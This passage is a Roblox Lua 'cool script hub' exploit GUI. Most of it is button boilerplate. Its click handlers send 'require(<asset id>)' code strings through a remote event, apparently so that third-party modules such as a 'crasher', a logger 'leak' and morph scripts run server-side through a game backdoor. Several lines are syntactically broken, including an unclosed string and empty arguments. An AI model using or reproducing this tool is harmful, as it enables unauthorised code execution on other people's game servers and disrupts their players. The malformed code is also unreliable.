LMG["UIStroke_3b"]["Transparency"] = 0.5;
LMG["UIStroke_3b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_3b"]["Color"] = Color3.fromRGB(98, 98, 98);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.energy gorgon
LMG["energy gorgon_3c"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["energy gorgon_3c"]["TextWrapped"] = true;
LMG["energy gorgon_3c"]["BorderSizePixel"] = 0;
LMG["energy gorgon_3c"]["TextSize"] = 18;
LMG["energy gorgon_3c"]["TextScaled"] = true;
LMG["energy gorgon_3c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["energy gorgon_3c"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["energy gorgon_3c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["energy gorgon_3c"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["energy gorgon_3c"]["Text"] = [[energy gorgon]];
LMG["energy gorgon_3c"]["Name"] = [[energy gorgon]];


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.energy gorgon.UICorner
LMG["UICorner_3d"] = Instance.new("UICorner", LMG["energy gorgon_3c"]);
LMG["UICorner_3d"]["CornerRadius"] = UDim.new(0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.energy gorgon.LocalScript
LMG["LocalScript_3e"] = Instance.new("LocalScript", LMG["energy gorgon_3c"]);



-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.energy gorgon.UIStroke
LMG["UIStroke_3f"] = Instance.new("UIStroke", LMG["energy gorgon_3c"]);
LMG["UIStroke_3f"]["Transparency"] = 0.5;
LMG["UIStroke_3f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_3f"]["Color"] = Color3.fromRGB(98, 98, 98);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.killbot v4
LMG["killbot v4_40"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["killbot v4_40"]["TextWrapped"] = true;
LMG["killbot v4_40"]["BorderSizePixel"] = 0;
LMG["killbot v4_40"]["TextSize"] = 18;
LMG["killbot v4_40"]["TextScaled"] = true;
LMG["killbot v4_40"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["killbot v4_40"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["killbot v4_40"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["killbot v4_40"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["killbot v4_40"]["Text"] = [[killbotv4]];
LMG["killbot v4_40"]["Name"] = [[killbot v4]];


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.killbot v4.UICorner
LMG["UICorner_41"] = Instance.new("UICorner", LMG["killbot v4_40"]);
LMG["UICorner_41"]["CornerRadius"] = UDim.new(0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.killbot v4.LocalScript
LMG["LocalScript_42"] = Instance.new("LocalScript", LMG["killbot v4_40"]);



-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.killbot v4.UIStroke
LMG["UIStroke_43"] = Instance.new("UIStroke", LMG["killbot v4_40"]);
LMG["UIStroke_43"]["Transparency"] = 0.5;
LMG["UIStroke_43"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_43"]["Color"] = Color3.fromRGB(98, 98, 98);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.kingpin
LMG["kingpin_44"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["kingpin_44"]["TextWrapped"] = true;
LMG["kingpin_44"]["BorderSizePixel"] = 0;
LMG["kingpin_44"]["TextSize"] = 18;
LMG["kingpin_44"]["TextScaled"] = true;
LMG["kingpin_44"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["kingpin_44"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["kingpin_44"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["kingpin_44"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["kingpin_44"]["Text"] = [[kingpin]];
LMG["kingpin_44"]["Name"] = [[kingpin]];


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.kingpin.UICorner
LMG["UICorner_45"] = Instance.new("UICorner", LMG["kingpin_44"]);
LMG["UICorner_45"]["CornerRadius"] = UDim.new(0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.kingpin.LocalScript
LMG["LocalScript_46"] = Instance.new("LocalScript", LMG["kingpin_44"]);



-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.kingpin.UIStroke
LMG["UIStroke_47"] = Instance.new("UIStroke", LMG["kingpin_44"]);
LMG["UIStroke_47"]["Transparency"] = 0.5;
LMG["UIStroke_47"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_47"]["Color"] = Color3.fromRGB(98, 98, 98);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.oliver
LMG["oliver_48"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["oliver_48"]["TextWrapped"] = true;
LMG["oliver_48"]["BorderSizePixel"] = 0;
LMG["oliver_48"]["TextSize"] = 18;
LMG["oliver_48"]["TextScaled"] = true;
LMG["oliver_48"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["oliver_48"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["oliver_48"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["oliver_48"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["oliver_48"]["Text"] = [[oliver]];
LMG["oliver_48"]["Name"] = [[oliver]];


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.oliver.UICorner
LMG["UICorner_49"] = Instance.new("UICorner", LMG["oliver_48"]);
LMG["UICorner_49"]["CornerRadius"] = UDim.new(0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.oliver.LocalScript
LMG["LocalScript_4a"] = Instance.new("LocalScript", LMG["oliver_48"]);



-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.oliver.UIStroke
LMG["UIStroke_4b"] = Instance.new("UIStroke", LMG["oliver_48"]);
LMG["UIStroke_4b"]["Transparency"] = 0.5;
LMG["UIStroke_4b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_4b"]["Color"] = Color3.fromRGB(98, 98, 98);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.para v2
LMG["para v2_4c"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["para v2_4c"]["TextWrapped"] = true;
LMG["para v2_4c"]["BorderSizePixel"] = 0;
LMG["para v2_4c"]["TextSize"] = 18;
LMG["para v2_4c"]["TextScaled"] = true;
LMG["para v2_4c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["para v2_4c"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["para v2_4c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["para v2_4c"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["para v2_4c"]["Text"] = [[paranoy v2]];
LMG["para v2_4c"]["Name"] = [[para v2]];


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.para v2.UICorner
LMG["UICorner_4d"] = Instance.new("UICorner", LMG["para v2_4c"]);
LMG["UICorner_4d"]["CornerRadius"] = UDim.new(0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.para v2.LocalScript
LMG["LocalScript_4e"] = Instance.new("LocalScript", LMG["para v2_4c"]);



-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.para v2.UIStroke
LMG["UIStroke_4f"] = Instance.new("UIStroke", LMG["para v2_4c"]);
LMG["UIStroke_4f"]["Transparency"] = 0.5;
LMG["UIStroke_4f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_4f"]["Color"] = Color3.fromRGB(98, 98, 98);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.require exe
LMG["require exe_50"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["require exe_50"]["TextWrapped"] = true;
LMG["require exe_50"]["BorderSizePixel"] = 0;
LMG["require exe_50"]["TextSize"] = 18;
LMG["require exe_50"]["TextScaled"] = true;
LMG["require exe_50"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["require exe_50"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["require exe_50"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["require exe_50"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["require exe_50"]["Text"] = [[require exe]];
LMG["require exe_50"]["Name"] = [[require exe]];


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.require exe.UICorner
LMG["UICorner_51"] = Instance.new("UICorner", LMG["require exe_50"]);
LMG["UICorner_51"]["CornerRadius"] = UDim.new(0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.require exe.LocalScript
LMG["LocalScript_52"] = Instance.new("LocalScript", LMG["require exe_50"]);



-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.require exe.UIStroke
LMG["UIStroke_53"] = Instance.new("UIStroke", LMG["require exe_50"]);
LMG["UIStroke_53"]["Transparency"] = 0.5;
LMG["UIStroke_53"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_53"]["Color"] = Color3.fromRGB(98, 98, 98);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.schizophrenia
LMG["schizophrenia_54"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["schizophrenia_54"]["TextWrapped"] = true;
LMG["schizophrenia_54"]["BorderSizePixel"] = 0;
LMG["schizophrenia_54"]["TextSize"] = 18;
LMG["schizophrenia_54"]["TextScaled"] = true;
LMG["schizophrenia_54"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["schizophrenia_54"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["schizophrenia_54"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["schizophrenia_54"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["schizophrenia_54"]["Text"] = [[schizo]];
LMG["schizophrenia_54"]["Name"] = [[schizophrenia]];


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.schizophrenia.UICorner
LMG["UICorner_55"] = Instance.new("UICorner", LMG["schizophrenia_54"]);
LMG["UICorner_55"]["CornerRadius"] = UDim.new(0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.schizophrenia.LocalScript
LMG["LocalScript_56"] = Instance.new("LocalScript", LMG["schizophrenia_54"]);



-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.schizophrenia.UIStroke
LMG["UIStroke_57"] = Instance.new("UIStroke", LMG["schizophrenia_54"]);
LMG["UIStroke_57"]["Transparency"] = 0.5;
LMG["UIStroke_57"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_57"]["Color"] = Color3.fromRGB(98, 98, 98);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.096 unity
LMG["096 unity_58"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["096 unity_58"]["TextWrapped"] = true;
LMG["096 unity_58"]["BorderSizePixel"] = 0;
LMG["096 unity_58"]["TextSize"] = 18;
LMG["096 unity_58"]["TextScaled"] = true;
LMG["096 unity_58"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["096 unity_58"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["096 unity_58"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["096 unity_58"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["096 unity_58"]["Text"] = [[096 unity]];
LMG["096 unity_58"]["Name"] = [[096 unity]];

LMG["scribble"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["scribble"]["TextWrapped"] = true;
LMG["scribble"]["BorderSizePixel"] = 0;
LMG["scribble"]["TextSize"] = 18;
LMG["scribble"]["TextScaled"] = true;
LMG["scribble"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["scribble"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["scribble"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["scribble"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["scribble"]["Text"] = [[scribble head]];
LMG["scribble"]["Name"] = [[scribble head]];

LMG["UICorner_scribble"] = Instance.new("UICorner", LMG["scribble"]);
LMG["UICorner_scribble"]["CornerRadius"] = UDim.new(0, 6);

LMG["UIStroke_scribble"] = Instance.new("UIStroke", LMG["scribble"]);
LMG["UIStroke_scribble"]["Transparency"] = 0.5;
LMG["UIStroke_scribble"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_scribble"]["Color"] = Color3.fromRGB(98, 98, 98);

LMG["sabre"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["sabre"]["TextWrapped"] = true;
LMG["sabre"]["BorderSizePixel"] = 0;
LMG["sabre"]["TextSize"] = 18;
LMG["sabre"]["TextScaled"] = true;
LMG["sabre"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["sabre"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["sabre"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["sabre"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["sabre"]["Text"] = [[sabre²]];
LMG["sabre"]["Name"] = [[sabre]];

LMG["UICorner_sabre"] = Instance.new("UICorner", LMG["sabre"]);
LMG["UICorner_sabre"]["CornerRadius"] = UDim.new(0, 6);

LMG["UIStroke_sabre"] = Instance.new("UIStroke", LMG["sabre"]);
LMG["UIStroke_sabre"]["Transparency"] = 0.5;
LMG["UIStroke_sabre"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_sabre"]["Color"] = Color3.fromRGB(98, 98, 98);

-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.096 unity.UICorner
LMG["UICorner_59"] = Instance.new("UICorner", LMG["096 unity_58"]);
LMG["UICorner_59"]["CornerRadius"] = UDim.new(0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.096 unity.LocalScript
LMG["LocalScript_5a"] = Instance.new("LocalScript", LMG["096 unity_58"]);



-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.096 unity.UIStroke
LMG["UIStroke_5b"] = Instance.new("UIStroke", LMG["096 unity_58"]);
LMG["UIStroke_5b"]["Transparency"] = 0.5;
LMG["UIStroke_5b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_5b"]["Color"] = Color3.fromRGB(98, 98, 98);

LMG["crasher"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["crasher"]["TextWrapped"] = true;
LMG["crasher"]["BorderSizePixel"] = 0;
LMG["crasher"]["TextSize"] = 18;
LMG["crasher"]["TextScaled"] = true;
LMG["crasher"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["crasher"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["crasher"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["crasher"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["crasher"]["Text"] = [[crasher]];
LMG["crasher"]["Name"] = [[crasher]];

LMG["UICorner_crasher"] = Instance.new("UICorner", LMG["crasher"]);
LMG["UICorner_crasher"]["CornerRadius"] = UDim.new(0, 6);

LMG["UIStroke_crasher"] = Instance.new("UIStroke", LMG["crasher"]);
LMG["UIStroke_crasher"]["Transparency"] = 0.5;
LMG["UIStroke_crasher"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_crasher"]["Color"] = Color3.fromRGB(98, 98, 98);

local code = 'require(134835962035545).MorphMonster("' .. game.Players.LocalPlayer.Name .. '", "crasher")'	
	
LMG["crasher"].MouseButton1Click:Connect(function()	
	fireRemoteEvent(code)	
end)	

LMG["chungus"] = Instance.new("TextButton", LMG["ScrollingFrame_4"]);
LMG["chungus"]["TextWrapped"] = true;
LMG["chungus"]["BorderSizePixel"] = 0;
LMG["chungus"]["TextSize"] = 18;
LMG["chungus"]["TextScaled"] = true;
LMG["chungus"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["chungus"]["BackgroundColor3"] = Color3.fromRGB(19, 21, 24);
LMG["chungus"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG["chungus"]["Size"] = UDim2.new(0, 66, 0, 42);
LMG["chungus"]["Text"] = [[chungus]];
LMG["chungus"]["Name"] = [[chungus]];

LMG["UICorner_chungus"] = Instance.new("UICorner", LMG["chungus"]);
LMG["UICorner_chungus"]["CornerRadius"] = UDim.new(0, 6);

LMG["UIStroke_chungus"] = Instance.new("UIStroke", LMG["chungus"]);
LMG["UIStroke_chungus"]["Transparency"] = 0.5;
LMG["UIStroke_chungus"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_chungus"]["Color"] = Color3.fromRGB(98, 98, 98);

local code = 'require(98659223446383)("' .. game.Players.LocalPlayer.Name .. '")'	
	
LMG["chungus"].MouseButton1Click:Connect(function()	
	fireRemoteEvent(code)	
end)	

local function createButton(name, id, funcName, args)
    local btn = Instance.new("TextButton", LMG["ScrollingFrame_4"])

    btn.Name = name
    btn.Text = name
    btn.Size = UDim2.new(0, 66, 0, 42)
    btn.BackgroundColor3 = Color3.fromRGB(19,21,24)
    btn.TextColor3 = Color3.fromRGB(255,255,255)
    btn.TextScaled = true
    btn.BorderSizePixel = 0
    btn.FontFace = Font.new(
        "rbxasset://fonts/families/GothamSSm.json",
        Enum.FontWeight.Medium
    )

    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,6)

    local stroke = Instance.new("UIStroke", btn)
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.Transparency = 0.5
    stroke.Color = Color3.fromRGB(98,98,98)

    btn.MouseButton1Click:Connect(function()
        local argString = ""

        if args then
            for i, v in ipairs(args) do
                if typeof(v) == "string" then
                    argString ..= '"'..v..'"'
                else
                    argString ..= tostring(v)
                end

                if i < #args then
                    argString ..= ","
                end
            end
        end

        local code = 'require('..id..').'..funcName..'('..argString..')'
        fireRemoteEvent(code)
    end)
end
local lp = game.Players.LocalPlayer.Name

createButton("barney", 108796910844970, "MorphMonster", {lp, "Barney"})
createButton("antlionalyx", 97331759261813, "MorphMonster", {lp, "antlionalyx"})
createButton("antlionguard", 97331759261813, "MorphMonster", {lp, "antlionguard"})
createButton("fastzombie", 97331759261813, "MorphMonster", {lp, "fastzombie"})
createButton("gargantua", 97331759261813, "MorphMonster", {lp, "gargantua"})
createButton("grunt", 97331759261813, "MorphMonster", {lp, "grunt"})
createButton("hl2 barnacle, 97331759261813, "MorphMonster", {lp, "hl2barnacle"})
createButton("hl2 hunter", 97331759261813, "MorphMonster", {lp, "hl2hunter"})
createButton("poison zombie", 97331759261813, "MorphMonster", {lp, "poison zombie"})
createButton("strider", 97331759261813, "MorphMonster", {lp, "strider"})
createButton("vortigaunt", 97331759261813, "MorphMonster", {lp, "vortigaunt"})
createButton("fast zombie", 108796910844970, "MorphMonster", {lp, "FastZombie"})
createButton("headcrab zombie", 108796910844970, "MorphMonster", {lp, "HeadcrabZombie"})
createButton("fast headcrab", 108796910844970, "MorphMonster", {lp, "FastHeadcrab"})
createButton("poison headcrab", 108796910844970, "MorphMonster", {lp, "PoisonHeadcrab"})
createButton("headcrab", 108796910844970, "MorphMonster", {lp, "Headcrab"})
createButton("hl1 headcrab", 108796910844970, "MorphMonster", {lp, "HL1Headcrab"})
createButton("cremator", 92422644804143, "MorphMonster", {lp, "cremator"})
createButton("gonome", 92422644804143, "MorphMonster", {lp, "gonome"})
createButton("tentaclev2", 92422644804143, "MorphMonster", {lp, "tentacle v2"})
createButton("shocktrooper", 92422644804143, "MorphMonster", {lp, "shocktrooper"})
createButton("sergeant", 92422644804143, "MorphMonster", {lp, "sergeant"})
createButton("mr friendly", 92422644804143, "MorphMonster", {lp, "mr friendly"})
createButton("bullsquid", 92422644804143, "MorphMonster", {lp, "bullsquid"})
createButton("floater", 92422644804143, "MorphMonster", {lp, "floater"})
createButton("gonarch", 102798848281487, "MorphMonster", {lp, "gonarch"})
createButton("stukabat", 118010581213399, "MorphMonster", {lp, "stukabat"})



createButton("twist bobette", 91204966217453, "MorphMonster", {lp, "Twisted Bobette"})
createButton("vee", 91204966217453, "MorphMonster", {lp, "Vee"})
createButton("twist connie", 91204966217453, "MorphMonster", {lp, "Twisted Connie"})

createButton("", , "MorphMonster", {lp, ""})
createButton("", , "MorphMonster", {lp, ""})
createButton("", , "MorphMonster", {lp, ""})


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.UIStroke
LMG["UIStroke_5c"] = Instance.new("UIStroke", LMG["Frame_2"]);
LMG["UIStroke_5c"]["Transparency"] = 0.5;
LMG["UIStroke_5c"]["Color"] = Color3.fromRGB(98, 98, 98);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.Frame
LMG["Frame_5d"] = Instance.new("Frame", LMG["Frame_2"]);
LMG["Frame_5d"]["BorderSizePixel"] = 0;
LMG["Frame_5d"]["BackgroundColor3"] = Color3.fromRGB(27, 28, 33);
LMG["Frame_5d"]["Size"] = UDim2.new(0, 334, 0, 22);
LMG["Frame_5d"]["Position"] = UDim2.new(0, 6, 0, 6);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.Frame.s
LMG["s_5e"] = Instance.new("TextLabel", LMG["Frame_5d"]);
LMG["s_5e"]["BorderSizePixel"] = 0;
LMG["s_5e"]["TextSize"] = 16;
LMG["s_5e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG["s_5e"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LMG["s_5e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG["s_5e"]["BackgroundTransparency"] = 1;
LMG["s_5e"]["RichText"] = true;
LMG["s_5e"]["Size"] = UDim2.new(0, 260, 0, 16);
LMG["s_5e"]["Text"] = [[cool script hub]];
LMG["s_5e"]["Name"] = [[s]];
LMG["s_5e"]["Position"] = UDim2.new(0, 38, 0, 2);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.Frame.UICorner
LMG["UICorner_5f"] = Instance.new("UICorner", LMG["Frame_5d"]);
LMG["UICorner_5f"]["CornerRadius"] = UDim.new(0, 6)

-- Players.greguiscool.PlayerGui.ScreenGui.Frame.Frame.UIStroke
LMG["UIStroke_62"] = Instance.new("UIStroke", LMG["Frame_5d"]);
LMG["UIStroke_62"]["Transparency"] = 0.5;
LMG["UIStroke_62"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG["UIStroke_62"]["Color"] = Color3.fromRGB(98, 98, 98);


-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.Logger.LocalScript
local function C_7()
	local script = LMG["LocalScript_7"];
	local code = 'require(7720644326).SharkGodsLoggerLeak("' .. game.Players.LocalPlayer.Name .. '")'	
	
	script.Parent.MouseButton1Click:Connect(function()	
	      fireRemoteEvent(code)	
	end)	
end;
task.spawn(C_7);
-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.FSEV2.LocalScript
local function C_b()
	local script = LMG["LocalScript_b"];
	local code = '("' .. game.Players.LocalPlayer.Name .. '")'	
	
	script.Parent.MouseButton1Click:Connect(function()	
	      fireRemoteEvent(code)	
	end)	
end;
task.spawn(C_b);
-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.Abbie fpe.LocalScript
local function C_12()
	local script = LMG["LocalScript_12"];
	local code = 'require(126250637889071)("' .. game.Players.LocalPlayer.Name .. '")'	
	
	script.Parent.MouseButton1Click:Connect(function()	
	      fireRemoteEvent(code)	
	end)	
end;
task.spawn(C_12);
-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.Miss Circle.LocalScript
local function C_16()
	local script = LMG["LocalScript_16"];
	local code = 'require(71359648090331).MorphMonster("' .. game.Players.LocalPlayer.Name .. '", "Miss Circle")'	
	
	script.Parent.MouseButton1Click:Connect(function()	
	      fireRemoteEvent(code)	
	end)	
end;
task.spawn(C_16);
-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.Aiden.LocalScript
local function C_1a()
	local script = LMG["LocalScript_1a"];
	local code = 'require(79669656266234)("' .. game.Players.LocalPlayer.Name .. '")'	
	
	script.Parent.MouseButton1Click:Connect(function()	
	      fireRemoteEvent(code)	
	end)	
end;
task.spawn(C_1a);
-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.boderman exe.LocalScript
local function C_1e()
	local script = LMG["LocalScript_1e"];
	local code = 'require(105380634773217)("' .. game.Players.LocalPlayer.Name .. '")'	
	
	script.Parent.MouseButton1Click:Connect(function()	
	      fireRemoteEvent(code)	
	end)	
end;
task.spawn(C_1e);
-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.prototype.LocalScript
local function C_22()
	local script = LMG["LocalScript_22"];
	local code = 'require(73755486018996).MorphMonster("' .. game.Players.LocalPlayer.Name .. '", "Prototype")'	
	
	script.Parent.MouseButton1Click:Connect(function()	
	      fireRemoteEvent(code)	
	end)	
end;
task.spawn(C_22);
-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.f.e.n.LocalScript
local function C_26()
	local script = LMG["LocalScript_26"];
	local code = 'require(138925696344980)("greguiscool")("' .. game.Players.LocalPlayer.Name .. '")'	
	
	script.Parent.MouseButton1Click:Connect(function()	
	      fireRemoteEvent(code)	
	end)	
end;
task.spawn(C_26);
-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.ratiz.LocalScript
local function C_2a()
	local script = LMG["LocalScript_2a"];
	local code = 'require(121358724720737):load("' .. game.Players.LocalPlayer.Name .. '")'	
	
	script.Parent.MouseButton1Click:Connect(function()	
	      fireRemoteEvent(code)	
	end)	
end;
task.spawn(C_2a);
-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.stummy guns.LocalScript
local function C_2e()
	local script = LMG["LocalScript_2e"];
	local code = 'require(85641071395989)("' .. game.Players.LocalPlayer.Name .. '")'	
	
	script.Parent.MouseButton1Click:Connect(function()	
	      fireRemoteEvent(code)	
	end)	
end;
task.spawn(C_2e);
-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.the imposter.LocalScript
local function C_32()
	local script = LMG["LocalScript_32"];
	local code = 'require(97212321215045).MorphMonster("' .. game.Players.LocalPlayer.Name .. '", "the imposter")'	
	
	script.Parent.MouseButton1Click:Connect(function()	
	      fireRemoteEvent(code)	
	end)	
end;
task.spawn(C_32);
-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.starfish.LocalScript
local function C_36()
	local script = LMG["LocalScript_36"];
	local code = 'require(100904586046368).load("' .. game.Players.LocalPlayer.Name .. '")'	
	
	script.Parent.MouseButton1Click:Connect(function()	
	      fireRemoteEvent(code)	
	end)	
end;
task.spawn(C_36);
-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.sonic eyx v2.LocalScript
local function C_3a()
	local script = LMG["LocalScript_3a"];
	local code = 'require(119637723627363)("' .. game.Players.LocalPlayer.Name .. '")'	
	
	script.Parent.MouseButton1Click:Connect(function()	
	      fireRemoteEvent(code)	
	end)	
end;
task.spawn(C_3a);
-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.energy gorgon.LocalScript
local function C_3e()
	local script = LMG["LocalScript_3e"];
	local code = 'require(129543773468626).load("' .. game.Players.LocalPlayer.Name .. '")'	
	
	script.Parent.MouseButton1Click:Connect(function()	
	      fireRemoteEvent(code)	
	end)	
end;
task.spawn(C_3e);
-- Players.greguiscool.PlayerGui.ScreenGui.Frame.ScrollingFrame.killbot v4.LocalScript
local function C_42()
	local script = LMG["LocalScript_42"];
